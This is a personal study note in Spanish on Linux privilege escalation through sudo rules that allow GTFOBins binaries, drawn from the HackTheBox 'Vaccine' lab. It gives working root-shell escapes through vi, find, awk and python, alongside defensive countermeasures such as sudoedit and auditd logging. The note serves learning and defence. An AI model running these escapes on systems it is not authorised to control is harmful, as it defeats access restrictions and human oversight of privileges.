---
tags:
  - tecnica
  - categoria/privilege-escalation
  - os/linux
  - nivel/basico
fecha_aprendida: 2026-09-09
fuente: HTB/Vaccine
mitre_technique: T1548.003
---
# ⚔️ Privilege Escalation vía GTFOBins (abuso de sudo)

> [!abstract] Resumen
> Cuando `sudo -l` muestra que el usuario puede ejecutar un binario específico como otro usuario (o como root), y ese binario aparece en GTFOBins con función de "ejecutar shell", la restricción de sudoers se puede saltar usando las capacidades internas del propio binario — sin exploit, sin CVE.

---

## ¿Qué es y por qué funciona?

`sudo` restringe el **comando y los argumentos exactos** que puede ejecutar un usuario — no restringe lo que ese binario hace una vez que ya está corriendo con privilegios elevados. Muchísimos binarios Unix legítimos (editores, paginadores, intérpretes, herramientas de backup) tienen una función incorporada para invocar un shell o ejecutar comandos externos, pensada para uso normal (ej. `:!comando` en vi para correr algo sin salir del editor). Si sudoers autoriza ese binario, esa función hereda los privilegios de la invocación — el binario no sabe ni le importa que está siendo usado para escapar, simplemente hace lo que siempre hizo.

GTFOBins (gtfobins.github.io) cataloga esto binario por binario: para cada uno, qué payload usar bajo SUID, sudo, capabilities, etc.

---

## Condiciones necesarias para que aplique

> [!warning] Requisitos
> - El usuario tiene una entrada en `sudo -l` para un binario específico (no necesariamente `(ALL) ALL`)
> - Ese binario aparece en GTFOBins con una entrada para "sudo"
> - Nada más — no requiere vulnerabilidad de software, versión específica, ni CVE

---

## Procedimiento

### Detección / Enumeración

```bash
# Primer comando con cualquier usuario nuevo que obtengas
sudo -l

# Con el/los binario(s) que aparezcan, consultar directo:
# https://gtfobins.github.io/gtfobins/<binario>/#sudo
```

### Explotación

```bash
# Intento directo — funciona si sudoers permite el binario sin restringir argumentos
sudo <binario> -c ':!/bin/sh' /dev/null        # ejemplo con vi

# Si sudoers restringe a un archivo/argumento específico (ej. solo puede
# abrir UN archivo puntual), el intento directo con argumentos extra falla:
# "Sorry, user X is not allowed to execute '<binario> <args_no_autorizados>'"
# → entrar al archivo tal cual está autorizado, y usar los comandos
#   internos del binario para invocar el shell desde adentro:
sudo <binario> <archivo_autorizado>
# Dentro del editor (vi/vim):
:set shell=/bin/sh
:shell

# Confirmar privilegios ya escalados:
whoami
id
```

> [!tip] Variaciones comunes
> - `less`/`more`/`man`: `!/bin/sh` desde el paginador
> - `find`: `sudo find . -exec /bin/sh \; -quit`
> - `awk`: `sudo awk 'BEGIN {system("/bin/sh")}'`
> - Python/Perl/Ruby con sudo: `sudo python3 -c 'import os; os.system("/bin/sh")'`
> - La shell resultante suele abrir en el `$HOME` del usuario original (no en `/root`) — si ya sos root, `cd /root` explícito para encontrar la flag/objetivo real

---

## Herramientas asociadas

| Herramienta | Función | Comando base |
| ----------- | ------- | ------------ |
| sudo -l | Enumerar qué puede ejecutar el usuario actual con privilegios elevados | `sudo -l` |
| GTFOBins (web) | Catálogo de payloads de escape por binario | `gtfobins.github.io/gtfobins/<binario>` |

---

## Contramedidas (defensa)

> [!info] ¿Cómo se previene?
> Auditar cada entrada de sudoers contra GTFOBins antes de desplegarla — si el binario tiene función de escape catalogada, esa regla es una vulnerabilidad, no una conveniencia operativa. Cuando el binario debe ser usado con sudo por necesidad real, restringir con `sudoedit` en vez de abrir el editor directo (sudoedit no ejecuta el binario con privilegios, solo edita el archivo y lo reemplaza), o envolver el uso en un wrapper que bloquee subprocesos. Logging de ejecución de procesos (auditd, EDR) para detectar la cadena binario→shell con UID elevado.

---

## Dónde la usé

- `[[HTB/Vaccine/Vaccine]]` — `sudo -l` mostraba `(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf`. El intento directo con `-c` falló por restricción de argumentos; funcionó abriendo el archivo autorizado tal cual y usando `:set shell=/bin/sh` + `:shell` desde dentro de vi.

---

## Referencias

- [GTFOBins](https://gtfobins.github.io/)
- [MITRE ATT&CK - T1548.003](https://attack.mitre.org/techniques/T1548/003/)
- [HackTricks - Sudo/Admin Group](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/sudo-and-suid)
